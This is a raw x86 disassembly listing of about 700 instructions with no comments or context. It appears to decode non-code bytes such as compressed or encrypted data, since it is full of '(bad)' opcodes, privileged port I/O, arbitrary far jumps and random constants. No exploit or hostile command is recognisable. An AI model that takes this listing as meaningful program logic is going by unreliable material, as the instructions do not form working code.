  416d29:	rol    BYTE PTR [esi],cl
  416d2b:	dec    ecx
  416d2c:	jne    0x416cb3
  416d2e:	pop    ebp
  416d2f:	cmp    bh,BYTE PTR [ecx-0x9fc442c]
  416d35:	aas    
  416d36:	ret    0x4406
  416d39:	mov    edi,DWORD PTR [edx]
  416d3b:	(bad)  
  416d3d:	repz jo 0x416d3b
  416d40:	adc    al,0x49
  416d42:	shl    DWORD PTR [ebx+0x74],0xe6
  416d46:	pop    esp
  416d47:	lea    edi,[esi]
  416d49:	sbb    dh,BYTE PTR [edx-0x1d]
  416d4c:	inc    edi
  416d4d:	jmp    0x4942:0xe0dd94f0
  416d54:	xchg   edi,eax
  416d55:	mov    ebx,DWORD PTR [ecx+0x56]
  416d58:	sub    dl,BYTE PTR ds:0xea2cf844
  416d5e:	inc    esp
  416d5f:	stos   BYTE PTR es:[edi],al
  416d60:	jge    0x416dba
  416d62:	mov    dl,0x79
  416d64:	(bad)  
  416d65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d67:	pusha  
  416d68:	pop    edx
  416d69:	cmp    DWORD PTR [edx],edi
  416d6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d6c:	gs cli 
  416d6e:	sti    
  416d6f:	int3   
  416d70:	adc    bh,BYTE PTR [ecx]
  416d72:	gs dec esp
  416d74:	mov    al,ds:0x1f434d0f
  416d79:	sub    bh,bl
  416d7b:	xchg   ebp,eax
  416d7c:	loope  0x416ddd
  416d7e:	hlt    
  416d7f:	(bad)  
  416d82:	dec    eax
  416d83:	lahf   
  416d84:	add    ah,ah
  416d86:	xchg   DWORD PTR [eax],esi
  416d88:	pmaxub mm4,QWORD PTR [esi]
  416d8b:	xchg   esi,eax
  416d8c:	sar    BYTE PTR [edx+0x76],0x22
  416d90:	call   0xe3d3e194
  416d95:	pop    esi
  416d96:	(bad)  
  416d97:	adc    al,0xec
  416d99:	pop    ebp
  416d9a:	adc    cl,0x6c
  416d9d:	lock (bad) 
  416d9f:	or     eax,0x1e507c89
  416da4:	mov    dh,0xa5
  416da6:	and    al,0x87
  416da8:	std    
  416da9:	mov    ecx,0xddc70928
  416dae:	(bad)  
  416daf:	out    0xa3,al
  416db1:	loop   0x416d5b
  416db3:	push   0x786c212a
  416db8:	xor    eax,0xc121584c
  416dbd:	popa   
  416dbe:	ins    BYTE PTR es:[edi],dx
  416dbf:	cld    
  416dc0:	xor    ah,bh
  416dc2:	mov    al,0x4f
  416dc4:	sbb    DWORD PTR [ebx],esp
  416dc6:	pop    esp
  416dc7:	push   eax
  416dc8:	inc    esp
  416dc9:	out    0x74,eax
  416dcb:	adc    eax,0x5569b161
  416dd0:	(bad)  
  416dd1:	out    0xa6,eax
  416dd3:	loope  0x416d5e
  416dd5:	or     DWORD PTR [ebx-0x64],0xffffffe6
  416dd9:	in     eax,0xc0
  416ddb:	and    eax,0x55f4dc65
  416de0:	or     BYTE PTR [edx+eax*2-0x63],0xda
  416de5:	and    al,0xc0
  416de7:	or     al,0x7f
  416de9:	xchg   esi,eax
  416dea:	and    eax,0xaec59978
  416def:	test   eax,0xa8e60153
  416df4:	and    ebx,ecx
  416df6:	into   
  416df7:	mov    ah,0x9d
  416df9:	int    0x0
  416dfb:	push   0x14
  416dfd:	xchg   ebp,eax
  416dfe:	push   0xfffffff7
  416e00:	and    dh,BYTE PTR [edx+0x143b29fe]
  416e06:	inc    edx
  416e07:	dec    eax
  416e08:	adc    eax,0x1a1051e
  416e0d:	retf   
  416e0e:	pop    edi
  416e0f:	popa   
  416e10:	push   ds
  416e11:	int3   
  416e12:	int    0x8f
  416e14:	pop    esi
  416e15:	icebp  
  416e16:	cmp    al,0x2a
  416e18:	leave  
  416e19:	mov    edx,DWORD PTR [ebp-0x3cf2cb4a]
  416e1f:	mov    BYTE PTR [edx],bl
  416e21:	push   ebx
  416e22:	test   BYTE PTR [edi+0xe],ah
  416e25:	adc    esp,DWORD PTR [ebx+0x24cb93aa]
  416e2b:	add    BYTE PTR [ebx+0x10c78f6d],0x60
  416e32:	add    ecx,DWORD PTR [eax-0xd715f32]
  416e38:	push   esp
  416e39:	jl     0x416e7b
  416e3b:	push   edi
  416e3c:	mov    ebp,0x54ade59c
  416e41:	lods   eax,DWORD PTR ds:[esi]
  416e42:	push   eax
  416e43:	hlt    
  416e44:	mov    DWORD PTR [ecx],ecx
  416e46:	int    0x56
  416e48:	loope  0x416e39
  416e4a:	dec    edx
  416e4b:	push   edi
  416e4c:	dec    esi
  416e4d:	mov    ecx,0xcf45189a
  416e52:	cmp    eax,DWORD PTR [esi-0x27e28260]
  416e58:	inc    ecx
  416e59:	ds xchg ecx,eax
  416e5b:	pop    ecx
  416e5c:	jecxz  0x416e49
  416e5e:	mov    bh,0xc
  416e60:	pop    esp
  416e61:	icebp  
  416e62:	(bad)  
  416e63:	aad    0x87
  416e65:	(bad)  
  416e66:	mov    eax,0x541093e
  416e6b:	repz loop 0x416ed1
  416e6e:	lods   al,BYTE PTR ds:[esi]
  416e6f:	outs   dx,DWORD PTR ds:[esi]
  416e70:	or     BYTE PTR [ebp+0x47],dl
  416e73:	dec    ecx
  416e74:	leave  
  416e75:	adc    eax,0xaa062b04
  416e7a:	cmp    BYTE PTR [eax+0x121940e8],bl
  416e80:	rcl    ecx,cl
  416e82:	loop   0x416ea1
  416e84:	sbb    BYTE PTR [ebx+0x2bd35a2d],bl
  416e8a:	sti    
  416e8b:	cmp    DWORD PTR [ebp+esi*8-0x20],ecx
  416e8f:	mov    al,0x20
  416e91:	cmp    al,0x26
  416e93:	inc    eax
  416e94:	add    cl,BYTE PTR [ecx]
  416e96:	out    dx,eax
  416e97:	cmp    esp,DWORD PTR [esi]
  416e99:	or     DWORD PTR [ebp+0x4f],ebx
  416e9c:	in     eax,0xd6
  416e9e:	push   0xffffffad
  416ea0:	cs push esp
  416ea2:	or     eax,0xe6037d90
  416ea7:	dec    eax
  416ea8:	int3   
  416ea9:	in     al,dx
  416eaa:	gs inc ebp
  416eac:	adc    ecx,0x95a78066
  416eb2:	and    edx,ebx
  416eb4:	(bad)
  416eb7:	icebp  
  416eb8:	imul   esp,DWORD PTR [edi],0xac639575
  416ebe:	fcmovnu st,st(0)
  416ec0:	jbe    0x416ef5
  416ec2:	addr16 ja 0x416f01
  416ec5:	pop    ecx
  416ec6:	aaa    
  416ec7:	add    al,0x22
  416ec9:	retf   0x6dbc
  416ecc:	repnz cmp DWORD PTR [esi+0x0],esp
  416ed0:	out    dx,eax
  416ed1:	enter  0x1ce2,0x31
  416ed5:	inc    edi
  416ed6:	pushf  
  416ed7:	jbe    0x416ef8
  416ed9:	jne    0x416e87
  416edb:	jmp    0x1ec0:0x6f1c9b88
  416ee2:	(bad)  
  416ee3:	xor    cl,dh
  416ee5:	in     al,dx
  416ee6:	out    0x1b,eax
  416ee8:	mov    dh,0xe6
  416eea:	pop    esi
  416eeb:	hlt    
  416eec:	mov    ah,0xe7
  416eee:	dec    edi
  416eef:	les    eax,FWORD PTR [eax+ebx*8+0x681546ed]
  416ef6:	das    
  416ef7:	call   0xed22:0x2b5db0e8
  416efe:	call   0xc1e7ce25
  416f03:	mov    bl,0xf0
  416f05:	cmp    BYTE PTR [ebx-0x75],bl
  416f08:	stos   BYTE PTR es:[edi],al
  416f09:	popa   
  416f0a:	sbb    ah,ah
  416f0c:	mov    bh,0xc7
  416f0e:	addr16 retf 
  416f10:	rcl    BYTE PTR [ecx-0x15],0xac
  416f14:	add    al,BYTE PTR [edi+0x434e823c]
  416f1a:	cs loop 0x416ef2
  416f1d:	data16 js 0x416ea6
  416f20:	rcl    cl,0x3e
  416f23:	dec    ebp
  416f24:	xor    al,0xca
  416f26:	not    ebp
  416f28:	cmp    eax,0x3a3d7885
  416f2d:	mov    al,0x3c
  416f2f:	jne    0x416f79
  416f31:	xor    al,0xd4
  416f33:	call   0x907ca680
  416f38:	cs cmp al,0x89
  416f3b:	fcom   QWORD PTR ds:0x82299a8c
  416f41:	xor    DWORD PTR [edx-0x61],ecx
  416f44:	and    DWORD PTR [ecx-0x1e47a33d],ebx
  416f4a:	or     DWORD PTR [ecx-0x4180baa0],0x33
  416f51:	rcr    DWORD PTR [eax-0x2c],cl
  416f54:	adc    edi,DWORD PTR [ebp+0x42]
  416f57:	cmp    ah,0x59
  416f5a:	jns    0x416f28
  416f5c:	into   
  416f5d:	xor    eax,0x2c68f2b7
  416f62:	cld    
  416f63:	pop    ebp
  416f64:	sar    DWORD PTR [ebx+0x76163b1b],cl
  416f6a:	iret   
  416f6b:	test   eax,0x1e458933
  416f70:	pusha  
  416f71:	out    dx,eax
  416f72:	xchg   ecx,eax
  416f73:	iret   
  416f74:	sbb    eax,0xd1332cc7
  416f79:	mov    edi,0x791d8345
  416f7e:	std    
  416f7f:	mov    dh,0xb7
  416f81:	fcom   QWORD PTR [eax+0x38]
  416f84:	sbb    esi,DWORD PTR [ebp-0x6e6b0060]
  416f8a:	cmp    ecx,ecx
  416f8c:	pop    edx
  416f8d:	(bad)  
  416f8e:	mov    DWORD PTR gs:[edx-0x52],edx
  416f92:	aas    
  416f93:	gs es sub al,0x15
  416f97:	call   0xfe73:0x9f46553f
  416f9e:	cmp    BYTE PTR [ebp+0x36],dh
  416fa1:	xor    ah,ch
  416fa3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fa4:	pop    ss
  416fa5:	xchg   ebx,edx
  416fa7:	add    ah,BYTE PTR [ecx+0x2d]
  416faa:	arpl   WORD PTR [ecx],ax
  416fac:	inc    eax
  416fad:	nop
  416fae:	and    eax,0x53beca52
  416fb3:	push   ecx
  416fb4:	js     0x416f8c
  416fb6:	or     DWORD PTR [ebx-0x6467a3f1],ebx
  416fbc:	scas   al,BYTE PTR es:[edi]
  416fbd:	and    al,0x7
  416fbf:	push   0xffffffcd
  416fc1:	pop    esp
  416fc2:	xchg   ebp,eax
  416fc3:	scas   al,BYTE PTR es:[edi]
  416fc4:	icebp  
  416fc5:	cmp    al,0xcb
  416fc7:	clc    
  416fc8:	sbb    ebp,DWORD PTR [ebx]
  416fca:	pushf  
  416fcb:	rol    BYTE PTR ds:0x6d930f90,0x7c
  416fd2:	mov    dh,0x81
  416fd4:	test   al,0x3c
  416fd6:	sub    al,0xe6
  416fd8:	mov    BYTE PTR [ecx],ch
  416fda:	sbb    ecx,esi
  416fdc:	retf   0xda5b
  416fdf:	fidivr DWORD PTR [edi+0x60f8408b]
  416fe5:	stc    
  416fe6:	push   cs
  416fe7:	dec    ebp
  416fe8:	jge    0x416f97
  416fea:	or     eax,0x3b561b3c
  416fef:	dec    ebx
  416ff0:	push   0xa4017cb4
  416ff5:	push   cs
  416ff6:	call   0x4069:0xb4b50df7
  416ffd:	push   ss
  416ffe:	adc    cl,BYTE PTR [edi+0x302ea67e]
  417004:	ds pop esi
  417006:	mov    edi,ds
  417008:	pop    ss
  417009:	clc    
  41700a:	aad    0xbf
  41700c:	test   BYTE PTR [edx+0x62],bl
  41700f:	mov    dl,0xd6
  417011:	mov    ebp,eax
  417013:	fwait
  417014:	mov    eax,0x744b0083
  417019:	fmul   QWORD PTR [ebx]
  41701b:	mov    ebp,esp
  41701d:	push   eax
  41701e:	xchg   esi,ebx
  417020:	adc    DWORD PTR [esi-0x5da6dd10],ebx
  417026:	cwde   
  417027:	sub    al,0xc7
  417029:	xchg   esp,eax
  41702a:	sar    dh,0x2b
  41702d:	mov    ds:0xfb8a74f2,al
  417032:	aad    0x35
  417034:	jo     0x417056
  417036:	idiv   DWORD PTR fs:[edx]
  417039:	and    al,0xac
  41703c:	sbb    eax,0xa3682cbc
  417041:	popf   
  417042:	or     bl,BYTE PTR [esi+0x2d]
  417045:	adc    DWORD PTR ss:[ebx+0x1d],ebp
  417049:	jmp    0x1b5:0x7b93db7f
  417050:	cmp    al,BYTE PTR [ebp+0x25]
  417053:	hlt    
  417054:	daa    
  417055:	sub    ebx,DWORD PTR [eax+ebx*1+0x2a9a053f]
  41705c:	xchg   edx,eax
  41705d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41705e:	cmp    DWORD PTR [edx+esi*8],eax
  417061:	mov    ebx,0x634a1f03
  417066:	push   ss
  417067:	jmp    0x417091
  417069:	jmp    0x7826:0xd7f75407
  417070:	loope  0x4170be
  417072:	bound  ebp,QWORD PTR [ebx-0x10]
  417075:	or     DWORD PTR [ecx-0x3eb98a49],ecx
  41707b:	into   
  41707c:	loop   0x4170c7
  41707e:	loop   0x417001
  417080:	xor    DWORD PTR [eax+ecx*8-0xaadbe6f],ecx
  417087:	xchg   edx,eax
  417088:	sbb    eax,0x57c343b0
  41708d:	daa    
  41708e:	jns    0x4170b5
  417090:	sbb    eax,0x5ece12df
  417095:	xor    DWORD PTR [edi-0x1],esp
  417098:	stc    
  417099:	or     BYTE PTR [ecx+0x42],bl
  41709c:	shl    bl,1
  41709e:	mov    ecx,es
  4170a0:	cmp    ah,BYTE PTR ds:0xe6d25eb
  4170a6:	into   
  4170a7:	stos   DWORD PTR es:[edi],eax
  4170a8:	adc    al,0x37
  4170aa:	ins    DWORD PTR es:[edi],dx
  4170ab:	imul   esp,edi,0xffffffce
  4170ae:	cmp    eax,0x88560e85
  4170b3:	push   esp
  4170b4:	inc    ebx
  4170b5:	push   ecx
  4170b6:	(bad)  
  4170b7:	popa   
  4170b8:	mov    cl,0x27
  4170ba:	dec    ebx
  4170bb:	(bad)  
  4170bc:	(bad)  
  4170be:	xor    BYTE PTR [edx],bl
  4170c0:	jnp    0x4170ee
  4170c2:	xlat   BYTE PTR ds:[ebx]
  4170c3:	add    BYTE PTR [edx],bl
  4170c5:	cmp    al,0xd5
  4170c7:	inc    ebp
  4170c8:	addr16 mov eax,0x693b1c06
  4170ce:	dec    ebx
  4170cf:	dec    esp
  4170d0:	out    dx,al
  4170d1:	adc    al,0x7a
  4170d3:	into   
  4170d4:	push   esi
  4170d5:	dec    esp
  4170d6:	ret    
  4170d7:	pusha  
  4170d8:	mov    ebx,0x1f68bd02
  4170dd:	aas    
  4170de:	sub    esp,DWORD PTR [ecx+0x43712820]
  4170e4:	mov    al,ds:0x16e75a83
  4170e9:	add    BYTE PTR [ebx-0x41491ae5],dl
  4170ef:	out    0x3d,eax
  4170f1:	pop    esi
  4170f2:	sub    BYTE PTR [edx+0x5d],bl
  4170f5:	ja     0x417123
  4170f7:	out    dx,al
  4170f8:	inc    esp
  4170f9:	sahf   
  4170fa:	jo     0x4170bb
  4170fc:	fcom   DWORD PTR [esi]
  4170fe:	inc    ebp
  4170ff:	jg     0x4170be
  417101:	mov    edx,0x8e31af90
  417106:	data16 mov ah,0x62
  417109:	mov    cl,0xfa
  41710b:	into   
  41710c:	les    edi,FWORD PTR [esi+0xb7f0ec9]
  417112:	push   0x3b
  417114:	pop    ss
  417115:	es xchg esp,eax
  417117:	ja     0x417167
  417119:	fucomip st,st(1)
  41711b:	sbb    edx,esp
  41711d:	pop    eax
  41711e:	pop    ebp
  41711f:	dec    DWORD PTR [edx-0x5]
  417122:	sub    edx,DWORD PTR [edx+0x48]
  417125:	retf   0xde2e
  417128:	push   eax
  417129:	xor    BYTE PTR [ebx-0x630d971f],dh
  41712f:	aad    0x3b
  417131:	cmp    ebx,DWORD PTR [ecx-0x2b]
  417134:	fisub  DWORD PTR [edi+0x55]
  417137:	xchg   ebx,eax
  417138:	repnz xchg eax,ebp
  41713b:	xchg   ecx,eax
  41713c:	jb     0x417182
  41713e:	ss popa 
  417140:	mov    al,ds:0xd9317d6
  417145:	pushf  
  417146:	(bad)  
  417147:	pusha  
  417148:	dec    edx
  417149:	inc    esp
  41714a:	add    DWORD PTR [esi-0x1107eac1],0x989f8b
  417154:	mov    BYTE PTR [edx-0x43],bl
  417157:	push   es
  417158:	pop    eax
  417159:	data16 not BYTE PTR ss:[ebx+edi*8+0x49ae3b27]
  417162:	rol    BYTE PTR [edi+ebx*8],1
  417165:	cdq    
  417166:	sahf   
  417167:	jo     0x4170fa
  417169:	cli    
  41716a:	fdiv   st,st(2)
  41716c:	ret    0x6bf0
  41716f:	cmp    eax,0x20b755ef
  417174:	loopne 0x4171dd
  417176:	adc    DWORD PTR [ecx],esp
  417178:	add    eax,0x53e1d617
  41717d:	mov    gs,WORD PTR [esi-0x1b9f8451]
  417183:	add    esp,esi
  417185:	cli    
  417186:	sub    BYTE PTR [ebx-0x27],cl
  417189:	mov    esp,0x9ab0fb75
  41718e:	(bad)  
  41718f:	cmp    cl,bl
  417191:	(bad)  
  417192:	pop    edi
  417193:	repnz icebp 
  417195:	dec    ecx
  417196:	mov    dl,BYTE PTR [ebx]
  417198:	clc    
  417199:	div    BYTE PTR [ecx-0x42dfc2dc]
  41719f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171a0:	mov    DWORD PTR [edx-0x673a4c16],0x8e3714de
  4171aa:	(bad)
  4171ad:	fdivr  st(3),st
  4171af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b0:	fnstenv [ebx+0x2f6f58d7]
  4171b6:	cmc    
  4171b7:	(bad)  
  4171b8:	xor    esp,DWORD PTR [ebp+0x68d6774f]
  4171be:	and    BYTE PTR [ebx],cl
  4171c0:	fstp   TBYTE PTR [ebp-0x9]
  4171c3:	repz adc BYTE PTR [edx+0x4d],bl
  4171c7:	scas   al,BYTE PTR es:[edi]
  4171c8:	sbb    al,BYTE PTR [ebx-0x3c]
  4171cb:	into   
  4171cc:	inc    DWORD PTR [edi]
  4171ce:	push   esi
  4171cf:	jns    0x417234
  4171d1:	and    BYTE PTR [eax+0x3e],ah
  4171d4:	mov    eax,0xbf20fade
  4171d9:	pop    eax
  4171da:	pop    ebp
  4171db:	enter  0x3d00,0x61
  4171df:	hlt    
  4171e0:	jb     0x4171d9
  4171e2:	imul   esi,DWORD PTR [ebx+ebx*1-0x5d6b41be],0xf7845816
  4171ed:	clc    
  4171ee:	xchg   ecx,eax
  4171ef:	data16 (bad) 
  4171f1:	ins    DWORD PTR es:[edi],dx
  4171f2:	jp     0x417261
  4171f4:	rol    ebx,cl
  4171f6:	jns    0x417254
  4171f8:	inc    esi
  4171f9:	lds    esi,FWORD PTR [edi]
  4171fb:	clc    
  4171fc:	(bad)  
  4171fd:	ja     0x417223
  4171ff:	pop    esi
  417200:	fcmovnbe st,st(0)
  417202:	outs   dx,DWORD PTR ds:[esi]
  417203:	jns    0x4171d4
  417205:	xor    dh,ah
  417207:	and    al,0x2
  417209:	mov    esp,0xe859a412
  41720e:	mov    WORD PTR [eax+0x117cef67],?
  417214:	cdq    
  417215:	mov    ds:0x28087ea2,eax
  41721a:	or     eax,0x85d733ca
  41721f:	lods   al,BYTE PTR ds:[esi]
  417220:	cmp    DWORD PTR [ebx],edi
  417222:	mov    dh,0x5a
  417224:	into   
  417225:	ds pop edx
  417227:	add    eax,0x6d7449f7
  41722c:	xor    esp,edi
  41722e:	push   esp
  41722f:	xor    dh,BYTE PTR [edx+0x6fa611b3]
  417235:	icebp  
  417236:	outs   dx,DWORD PTR ds:[esi]
  417237:	adc    BYTE PTR [ebx+0x20486b1b],ch
  41723d:	inc    edi
  41723e:	inc    BYTE PTR ds:0xe47f32ff
  417244:	xchg   ebx,eax
  417245:	sub    bh,BYTE PTR [edx+0x867c4f4]
  41724b:	pop    edi
  41724c:	das    
  41724d:	xor    BYTE PTR [esi+eax*1+0x23],al
  417251:	sbb    ebp,DWORD PTR [ebp-0xf]
  417254:	pop    es
  417255:	fist   WORD PTR [ebx]
  417257:	enter  0x11a1,0xaa
  41725b:	push   esi
  41725c:	fisub  WORD PTR [ecx-0x19]
  41725f:	cmc    
  417260:	xchg   esi,eax
  417261:	addr16 sub al,0x75
  417264:	daa    
  417265:	mov    WORD PTR [ecx+edi*8+0x3c0040d2],?
  41726c:	or     DWORD PTR [edi-0x5a],edx
  41726f:	sub    dl,BYTE PTR [esi]
  417271:	pop    eax
  417272:	stos   DWORD PTR es:[edi],eax
  417273:	rcr    BYTE PTR ds:0x28579cb4,0xa0
  41727a:	mov    cl,0xed
  41727c:	sahf   
  41727d:	pusha  
  41727e:	sub    dh,BYTE PTR [esi]
  417280:	xchg   edi,eax
  417281:	popf   
  417282:	jmp    0xcf53:0x5c14c74a
  417289:	sub    eax,esp
  41728b:	sbb    DWORD PTR [ecx],ebx
  41728d:	mov    DWORD PTR [edi],ecx
  41728f:	mov    WORD PTR [edx+eiz*1-0x84d0f87],cs
  417296:	push   ecx
  417297:	or     BYTE PTR [edx-0x53],bh
  41729a:	out    0x8,al
  41729c:	or     BYTE PTR [esi],dh
  41729e:	jecxz  0x4172e0
  4172a0:	out    0x21,eax
  4172a2:	rcr    bl,cl
  4172a4:	inc    edi
  4172a5:	ins    DWORD PTR es:[edi],dx
  4172a6:	pusha  
  4172a7:	push   0xffffffc1
  4172a9:	les    edx,FWORD PTR [esi+0x2d1b2158]
  4172af:	mov    al,ds:0x71a19aa1
  4172b4:	ret    0x6bf3
  4172b7:	mov    esi,DWORD PTR [eax+0x55]
  4172ba:	cmp    esi,DWORD PTR [edx]
  4172bc:	out    dx,eax
  4172bd:	jne    0x41730d
  4172bf:	jmp    0x41727b
  4172c1:	ins    BYTE PTR es:[edi],dx
  4172c2:	mov    ah,0x95
  4172c4:	jmp    0xa1beabf4
  4172c9:	cwde   
  4172ca:	push   esp
  4172cb:	xor    BYTE PTR [ecx+0x2a],dh
  4172ce:	cwde   
  4172cf:	nop
  4172d0:	ret    0x6293
  4172d3:	in     al,dx
  4172d4:	popa   
  4172d5:	rcl    edi,1
  4172d7:	xchg   edx,eax
  4172d8:	pop    ecx
  4172d9:	cld    
  4172da:	(bad)  
  4172db:	push   eax
  4172dc:	sub    al,BYTE PTR [edi-0x1f8d5fa3]
  4172e2:	inc    ebx
  4172e3:	rcr    BYTE PTR [edi],0xa5
  4172e6:	pop    ebp
  4172e7:	ret    
  4172e8:	mov    eax,ds:0xf2ebfe3e
  4172ed:	add    al,ch
  4172ef:	(bad)  
  4172f0:	int    0x6c
  4172f2:	push   esi
  4172f3:	fsubr  DWORD PTR [edi+0x59ecf40a]
  4172f9:	xchg   ebx,eax
  4172fa:	sub    al,BYTE PTR [ecx]
  4172fc:	or     BYTE PTR [edx+0x7a],0x23
  417300:	repnz inc esi
  417302:	sbb    edx,esi
  417304:	rol    DWORD PTR [esi+edi*8-0x7b],0x5a
  417309:	inc    eax
  41730a:	jns    0x417364
  41730c:	jecxz  0x41730b
  41730e:	jo     0x4172a5
  417310:	mov    al,0x3a
  417312:	inc    ebx
  417313:	lods   eax,DWORD PTR ds:[esi]
  417314:	enter  0x8827,0xe5
  417318:	pop    esp
  417319:	ret    0x3b2a
  41731c:	(bad)  
  41731d:	mov    ebx,0xb62559b5
  417322:	std    
  417323:	xchg   BYTE PTR [ebp-0x4c],dh
  417326:	stc    
  417327:	fwait
  417328:	xchg   BYTE PTR [esp+ebp*4-0x79801be],bl
  41732f:	or     DWORD PTR [ebp+0xb9f4a32],esp
  417335:	pop    edi
  417336:	stos   BYTE PTR es:[edi],al
  417337:	push   edx
  417338:	icebp  
  417339:	mov    ds:0x374bc237,eax
  41733e:	loop   0x417315
  417340:	push   edi
  417341:	mov    ecx,0x8d2b3563
  417346:	inc    edi
  417347:	mov    dh,BYTE PTR [edx]
  417349:	ins    DWORD PTR es:[edi],dx
  41734a:	scas   al,BYTE PTR es:[edi]
  41734b:	repz inc edx
  41734d:	add    al,0x44
  41734f:	xor    DWORD PTR [ecx-0x59],0xffffff88
  417353:	xor    BYTE PTR [eax],0xf1
  417356:	(bad)  
  417357:	adc    edi,edi
  417359:	aad    0x26
  41735b:	in     eax,0x7b
  41735d:	mov    BYTE PTR [edi+0x50],cl
  417360:	js     0x417355
  417362:	cs mov edi,ecx
  417365:	leave  
  417366:	fwait
  417367:	xor    ch,BYTE PTR [eax+0x7]
  41736a:	jnp    0x417357
  41736c:	lock test DWORD PTR ds:0xdf1f3aa4,edi
  417373:	sub    edx,DWORD PTR [ebp-0x2f]
  417376:	jno    0x4173f7
  417378:	sub    cl,ah
  41737a:	ins    BYTE PTR es:[edi],dx
  41737b:	push   edx
  41737c:	cs jge 0x4173ca
  41737f:	in     eax,0x6c
  417381:	mov    ebx,0xb0a9db49
  417386:	cwde   
  417387:	sbb    eax,0xeef73c77
  41738c:	fldcw  WORD PTR [eax+0x4e]
  41738f:	hlt    
  417390:	add    bh,BYTE PTR [ecx+0x57280356]
  417396:	test   eax,0xf00f4572
  41739b:	inc    edx
  41739c:	push   cs
  41739d:	in     al,0xe6
  41739f:	sbb    eax,0x28d19915
  4173a4:	xor    eax,0x887e987f
  4173a9:	es aad 0xe6
  4173ac:	lods   al,BYTE PTR ds:[esi]
  4173ad:	mov    cl,al
  4173af:	and    ebx,ebp
  4173b1:	push   esp
  4173b2:	out    dx,al
  4173b3:	xchg   DWORD PTR [ebx+0x66a1b6e7],edx
  4173b9:	xlat   BYTE PTR ds:[ebx]
  4173ba:	or     ebp,DWORD PTR [eax]
  4173bc:	je     0x41738e
  4173be:	and    BYTE PTR [edx],bh
  4173c0:	aas    
  4173c1:	cmp    BYTE PTR [ebx],cl
  4173c3:	jns    0x4173c6
  4173c5:	jle    0x4173a5
  4173c7:	(bad)  
  4173c8:	jne    0x41742c
  4173ca:	(bad)  
  4173cc:	repz call DWORD PTR [eax-0x38]
  4173d0:	or     BYTE PTR [edi+eax*1-0x1ca5582f],bl
  4173d7:	push   cs
  4173d8:	mov    ds:0x7f161673,al
  4173dd:	xcrypt-ofb (bad)
  4173de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173df:	outs   dx,DWORD PTR ds:[esi]
  4173e0:	push   esi
  4173e1:	shl    DWORD PTR [ebp+0x2de3fee2],1
  4173e7:	adc    al,0xf4
  4173e9:	ins    BYTE PTR es:[edi],dx
  4173ea:	iret   
  4173eb:	pop    ss
  4173ec:	je     0x417441
  4173ee:	outs   dx,DWORD PTR ds:[esi]
  4173ef:	lds    ebp,FWORD PTR [ecx-0x70]
  4173f2:	mov    ecx,0xd9f6d8ca
  4173f7:	pop    ds
  4173f8:	dec    eax
  4173f9:	xchg   esp,eax
  4173fa:	dec    ecx
  4173fb:	sub    eax,eax
  4173fd:	stc    
  4173fe:	out    0x5a,al
  417400:	mov    edx,0x27586f6b
  417405:	aam    0x49
  417407:	sbb    edx,DWORD PTR [ebx-0x67]
  41740a:	leave  
  41740b:	jle    0x417441
  41740d:	ins    BYTE PTR es:[edi],dx
  41740e:	int3   
  41740f:	add    BYTE PTR [edx+0xb],ch
  417412:	cld    
  417413:	lods   eax,DWORD PTR ds:[esi]
  417414:	enter  0x13f1,0xe8
  417418:	pop    ecx
  417419:	lock aas 
  41741b:	add    edx,DWORD PTR [esi+0x38]
  41741e:	loopne 0x41741f
  417420:	jnp    0x4173a3
  417422:	dec    esp
  417423:	addr16 push eax
  417425:	ss adc al,0x9f
  417428:	clc    
  417429:	adc    esi,DWORD PTR [edx+0x16cfbcbe]
  41742f:	aas    
  417430:	and    bx,di
  417433:	adc    DWORD PTR [ebp+0x63],edx
  417436:	in     eax,0x61
  417438:	dec    ebx
  417439:	(bad)  
  41743b:	push   esi
  41743c:	mov    al,ds:0x833510dd
  417441:	rcl    DWORD PTR [ebp+0x21],1
  417444:	xor    eax,0x3d4474c8
  417449:	mov    al,0x5a
  41744b:	and    eax,0xfcb8fc0a
  417450:	int    0x36
  417452:	ins    BYTE PTR es:[edi],dx
  417453:	clc    
  417454:	jo     0x8d8a2d56
  41745a:	dec    esi
  41745b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41745c:	and    DWORD PTR [edi+0x6e],ecx
  41745f:	jnp    0x4173e1
  417461:	xor    al,0x93
  417463:	enter  0x1244,0xea
  417467:	pop    eax
  417468:	(bad)  
  417469:	xor    eax,0xbe217043
  41746e:	scas   eax,DWORD PTR es:[edi]
  41746f:	push   ds
  417470:	dec    esi
  417471:	gs cwde 
  417473:	and    DWORD PTR [esi-0x36],ebp
  417476:	push   0xa2dd66cf
  41747b:	retf   
  41747c:	jns    0x4174f5
  41747e:	outs   dx,BYTE PTR ds:[esi]
  41747f:	(bad)  
  417480:	push   esp
  417481:	jb     0x417420
  417483:	mov    ds:0xca295100,eax
  417488:	shl    BYTE PTR [ecx-0x13],cl
  41748b:	in     al,0x30
  41748d:	test   ebp,esi
  41748f:	xchg   ecx,eax
  417490:	mov    ebp,0xe138786
  417495:	daa    
  417496:	aaa    
  417497:	mov    bh,0xde
  417499:	sub    al,0x18
  41749b:	pop    edi
  41749c:	int    0x4b
  41749e:	mov    fs,WORD PTR ss:[ecx+0x2f]
  4174a2:	retf   
  4174a3:	jbe    0x41751e
  4174a5:	out    dx,eax
  4174a6:	fwait
  4174a7:	pop    eax
  4174a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174a9:	enter  0x7104,0xd5
  4174ad:	and    BYTE PTR [edi],bh
  4174af:	(bad)  
  4174b0:	and    BYTE PTR [ebp-0x43],bl
  4174b3:	dec    edx
  4174b4:	xor    eax,ebp
  4174b6:	scas   eax,DWORD PTR es:[edi]
  4174b7:	push   cs
  4174b8:	or     eax,0xa65998f2
  4174bd:	jecxz  0x4174aa
  4174bf:	addr16 das 
  4174c1:	cmp    esp,0x8
  4174c4:	sub    eax,0xc7f73983
  4174c9:	push   ebx
  4174ca:	sahf   
  4174cb:	dec    esi
  4174cc:	mov    edx,0x2a0bf6fa
  4174d1:	sub    al,0x4b
  4174d3:	ficom  WORD PTR [edi]
  4174d5:	cld    
  4174d6:	popf   
  4174d7:	fwait
  4174d8:	jne    0x417464
